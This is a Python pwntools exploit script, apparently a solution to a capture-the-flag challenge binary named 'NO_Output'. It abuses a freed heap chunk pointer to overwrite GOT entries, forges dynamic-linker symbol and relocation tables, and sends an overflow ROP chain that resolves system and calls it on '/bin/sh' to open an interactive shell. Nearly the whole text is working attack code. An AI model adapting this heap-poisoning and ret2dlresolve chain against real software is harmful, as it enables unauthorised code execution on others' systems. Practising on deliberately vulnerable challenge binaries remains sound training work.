from pwn import *

context.arch = "amd64"
p = process('./NO_Output')

def send(a):
    p.sendline(str(a))

def send2(a):
    p.send(str(a))

def add(index,size,data):
    send(1)
    send(index)
    send(size)
    send(data)

def edit(index,data):
    send(2)
    send(index)
    send(data)

def delete(index):
    send(3)
    send(index)

send('filler')
add(0,100,'a')
add(1,100,'a')
add(2,100,'a')

delete(1)
delete(0)

chunks = 0x4040c0
edit(0,p64(chunks))

stack_fail = 0x404020
exit = 0x404058

ret = 0x40140b
init = 0x40123a

add(0,100,'a')
add(10,100,p64(stack_fail)+p64(exit)+p64(0x404200))

edit(0,p64(ret))
edit(1,p64(init))
elf = ELF('./NO_Output')
#dlresolve = Ret2dlresolvePayload(elf, symbol="system",args=["/bin/sh"])

jmptab = 0x4006c0
symtab = 0x4003d0
strtab = 0x400538

fakestrtab = "system\x00\x00" + p64(0)
fakesymtab = p64(0x404200-strtab) + p64(0)*3
fakejmptab = p64(0x404200) + p32(7) + p32((0x404210-symtab)/24) + p64(0xffffffffffffffff) 

fake = 'system\x00\x00'+p64(0)+p64(0x404200-strtab)+p64(0)*3 + p64(0x404200) + p32(7) + p32((0x404210-symtab)/24) + p64(0) + "/bin/sh\x00"
fake = fakestrtab + fakesymtab + fakejmptab + '/bin/sh\x00'
edit(2,fake)

rdi = 0x401663
dlresolve_addr = 0x401020
index = (0x404230-jmptab)/24
binsh = 0x404248 

send('6')

gdb.attach(p)
send('a'*40 + p64(rdi)+p64(binsh)+p64(dlresolve_addr)+p64(index))



p.interactive()

